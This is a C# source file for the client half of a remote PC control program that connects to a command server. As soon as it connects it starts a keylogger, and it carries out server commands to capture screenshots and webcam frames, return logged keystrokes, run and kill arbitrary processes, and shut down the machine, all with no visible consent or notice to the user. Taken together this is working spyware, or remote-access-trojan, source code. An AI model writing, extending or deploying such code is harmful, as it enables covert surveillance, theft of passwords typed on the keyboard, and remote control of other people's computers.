using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Linq;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using AForge.Video;
using AForge.Video.DirectShow;

namespace RemotePCControl
{
    public class ClientService
    {
        private TcpClient client;
        private NetworkStream stream;
        private string serverIp;
        private int serverPort;
        private string localIp;
        private string password;
        private bool isRunning = false;
        private KeyLogger keyLogger;
        private VideoCaptureDevice videoDevice;

        public ClientService(string serverIp, int serverPort)
        {
            this.serverIp = serverIp;
            this.serverPort = serverPort;
            this.localIp = GetLocalIPAddress();
            this.password = GeneratePassword();
        }

        public string LocalIp => localIp;
        public string Password => password;

        private string GetLocalIPAddress()
        {
            try
            {
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                    {
                        return ip.ToString();
                    }
                }
            }
            catch { }
            return "127.0.0.1";
        }

        private string GeneratePassword()
        {
            Random random = new Random();
            return random.Next(100000, 999999).ToString();
        }

        public bool Connect()
        {
            try
            {
                client = new TcpClient();
                client.Connect(serverIp, serverPort);
                stream = client.GetStream();
                isRunning = true;

                // Register với server
                string registerMessage = $"REGISTER_CONTROLLED|{localIp}|{password}";
                SendMessage(registerMessage);

                // Start listening thread
                Thread listenThread = new Thread(ListenForCommands);
                listenThread.Start();

                // Start keylogger
                keyLogger = new KeyLogger();
                keyLogger.Start();

                Console.WriteLine($"[CLIENT] Connected to server");
                Console.WriteLine($"[INFO] IP: {localIp}");
                Console.WriteLine($"[INFO] Password: {password}");

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Connection failed: {ex.Message}");
                return false;
            }
        }

        private void ListenForCommands()
        {
            byte[] lengthBuffer = new byte[4]; 

            while (isRunning && client.Connected)
            {
                try
                {
                    int bytesRead = 0;
                    while (bytesRead < 4)
                    {
                        int read = stream.Read(lengthBuffer, bytesRead, 4 - bytesRead);
                        if (read == 0) throw new Exception("Server disconnected");
                        bytesRead += read;
                    }
                    int messageLength = BitConverter.ToInt32(lengthBuffer, 0);

                    byte[] messageBuffer = new byte[messageLength];
                    bytesRead = 0;
                    while (bytesRead < messageLength)
                    {
                        int read = stream.Read(messageBuffer, bytesRead, messageLength - bytesRead);
                        if (read == 0) throw new Exception("Server disconnected");
                        bytesRead += read;
                    }

                    string message = Encoding.UTF8.GetString(messageBuffer, 0, messageLength);
                    Console.WriteLine($"[RECEIVED] {message.Substring(0, Math.Min(message.Length, 100))}"); 

                    ProcessCommand(message);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[ERROR] Listen: {ex.Message}");
                    break;
                }
            }
        }

        private void ProcessCommand(string message)
        {
            try
            {
                string[] parts = message.Split('|');
                if (parts[0] != "EXECUTE") return;

                string command = parts[1];
                string parameters = parts.Length > 2 ? string.Join("|", parts.Skip(2)) : "";

                string response = ExecuteCommand(command, parameters);
                SendResponse(response);
            }
            catch (Exception ex)
            {
                SendResponse($"ERROR|{ex.Message}");
            }
        }

        private string ExecuteCommand(string command, string parameters)
        {
            try
            {
                switch (command)
                {
                    case "LIST_APPS":
                        return ListApplications();

                    case "START_APP":
                        return StartApplication(parameters);

                    case "STOP_APP":
                        return StopApplication(parameters);

                    case "LIST_PROCESSES":
                        return ListProcesses();

                    case "START_PROCESS":
                        return StartProcess(parameters);

                    case "STOP_PROCESS":
                        return StopProcess(parameters);

                    case "SCREENSHOT":
                        return TakeScreenshot();

                    case "GET_KEYLOGS":
                        return GetKeyLogs();

                    case "CLEAR_KEYLOGS":
                        keyLogger.Clear();
                        return "SUCCESS|Keylogs cleared";

                    case "SHUTDOWN":
                        ShutdownPC();
                        return "SUCCESS|Shutting down";

                    case "RESTART":
                        RestartPC();
                        return "SUCCESS|Restarting";

                    case "WEBCAM_ON":
                        return StartWebcam();

                    case "WEBCAM_OFF":
                        return StopWebcam();

                    case "WEBCAM_CAPTURE":
                        return CaptureWebcam();

                    default:
                        return $"ERROR|Unknown command: {command}";
                }
            }
            catch (Exception ex)
            {
                return $"ERROR|{ex.Message}";
            }
        }

        private string ListApplications()
        {
            var apps = Process.GetProcesses()
                .Where(p => !string.IsNullOrEmpty(p.MainWindowTitle))
                .Select(p => $"{p.ProcessName}:{p.Id}:{p.MainWindowTitle}")
                .ToList();

            return $"APPS|{string.Join("||", apps)}";
        }

        private string StartApplication(string appPath)
        {
            Process.Start(appPath);
            return $"SUCCESS|Started {appPath}";
        }

        private string StopApplication(string processIdStr)
        {
            int processId = int.Parse(processIdStr);
            var process = Process.GetProcessById(processId);
            process.Kill();
            return $"SUCCESS|Stopped process {processId}";
        }

        private string ListProcesses()
        {
            var processes = Process.GetProcesses()
                .Select(p => $"{p.ProcessName}:{p.Id}:{GetProcessMemory(p)}")
                .ToList();

            return $"PROCESSES|{string.Join("||", processes)}";
        }

        private string GetProcessMemory(Process process)
        {
            try
            {
                return $"{process.WorkingSet64 / 1024 / 1024}MB";
            }
            catch
            {
                return "N/A";
            }
        }

        private string StartProcess(string processName)
        {
            Process.Start(processName);
            return $"SUCCESS|Started {processName}";
        }

        private string StopProcess(string processIdStr)
        {
            int processId = int.Parse(processIdStr);
            var process = Process.GetProcessById(processId);
            process.Kill();
            return $"SUCCESS|Stopped process {processId}";
        }

        private string TakeScreenshot()
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }

                    using (MemoryStream ms = new MemoryStream())
                    {
                        bitmap.Save(ms, ImageFormat.Jpeg);
                        byte[] imageBytes = ms.ToArray();
                        string base64 = Convert.ToBase64String(imageBytes);
                        return $"SCREENSHOT|{base64}";
                    }
                }
            }
            catch (Exception ex)
            {
                return $"ERROR|Screenshot failed: {ex.Message}";
            }
        }

        private string GetKeyLogs()
        {
            string logs = keyLogger.GetLogs();
            return $"KEYLOGS|{logs}";
        }

        private void ShutdownPC()
        {
            Process.Start("shutdown", "/s /t 0");
        }

        private void RestartPC()
        {
            Process.Start("shutdown", "/r /t 0");
        }

        private string StartWebcam()
        {
            try
            {
                FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (videoDevices.Count == 0)
                    return "ERROR|No webcam found";

                //chose webcam device
                FilterInfo chosenDevice = null;
                Console.WriteLine("[AGENT] Auto-detecting best webcam...");

                foreach (FilterInfo device in videoDevices)
                {
                    string nameLower = device.Name.ToLower();
                    Console.WriteLine($"[AGENT] Found device: {device.Name}");

                    //skip virtual/IR cameras
                    if (nameLower.Contains("virtual") ||
                        nameLower.Contains("ir") ||
                        nameLower.Contains("intel(r) virtual") ||
                        nameLower.Contains("hello"))
                    {
                        Console.WriteLine("[AGENT] -> Skipping (virtual/IR camera).");
                        continue;
                    }

                    chosenDevice = device;
                    Console.WriteLine($"[AGENT] -> SELECTED this device!");
                    break;
                }

                if (chosenDevice == null)
                {
                    throw new Exception("No suitable (non-virtual, non-IR) webcam found.");
                }

                videoDevice = new VideoCaptureDevice(chosenDevice.MonikerString);
                videoDevice.Start();

                return "SUCCESS|Webcam started";
            }
            catch (Exception ex)
            {
                return $"ERROR|{ex.Message}";
            }
        }

        private string StopWebcam()
        {
            if (videoDevice != null && videoDevice.IsRunning)
            {
                videoDevice.SignalToStop();
                videoDevice.WaitForStop();
                videoDevice = null;
                return "SUCCESS|Webcam stopped";
            }
            return "ERROR|Webcam not running";
        }

        private string CaptureWebcam()
        {
            try
            {
                if (videoDevice == null || !videoDevice.IsRunning)
                    return "ERROR|Webcam not running";

                Bitmap frame = null;
                videoDevice.NewFrame += (sender, eventArgs) =>
                {
                    frame = (Bitmap)eventArgs.Frame.Clone();
                };

                Thread.Sleep(500); // Wait for frame

                if (frame != null)
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        frame.Save(ms, ImageFormat.Jpeg);
                        byte[] imageBytes = ms.ToArray();
                        string base64 = Convert.ToBase64String(imageBytes);
                        return $"WEBCAM_IMAGE|{base64}";
                    }
                }

                return "ERROR|No frame captured";
            }
            catch (Exception ex)
            {
                return $"ERROR|{ex.Message}";
            }
        }

        private void SendMessage(string message)
        {
            try
            {
                byte[] data = Encoding.UTF8.GetBytes(message);
                byte[] lengthPrefix = BitConverter.GetBytes(data.Length); 

                stream.Write(lengthPrefix, 0, lengthPrefix.Length);
                stream.Write(data, 0, data.Length);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Send message: {ex.Message}");
            }
        }

        private void SendResponse(string response)
        {
            try
            {
                string message = $"RESPONSE|{localIp}|{response}";
                SendMessage(message);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Send response: {ex.Message}");
            }
        }

        public void Disconnect()
        {
            isRunning = false;
            keyLogger?.Stop();
            StopWebcam();
            stream?.Close();
            client?.Close();
        }
    }

    // KeyLogger Implementation
    public class KeyLogger
    {
        private StringBuilder logs = new StringBuilder();
        private bool isRunning = false;

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        public void Start()
        {
            isRunning = true;
            Thread thread = new Thread(LogKeys);
            thread.Start();
        }

        private void LogKeys()
        {
            while (isRunning)
            {
                Thread.Sleep(10);
                for (int i = 0; i < 255; i++)
                {
                    short state = GetAsyncKeyState(i);
                    if ((state & 0x8000) != 0)
                    {
                        string key = ((Keys)i).ToString();
                        logs.Append($"[{DateTime.Now:HH:mm:ss}] {key}\n");
                    }
                }
            }
        }

        public string GetLogs()
        {
            return logs.ToString();
        }

        public void Clear()
        {
            logs.Clear();
        }

        public void Stop()
        {
            isRunning = false;
        }
    }
}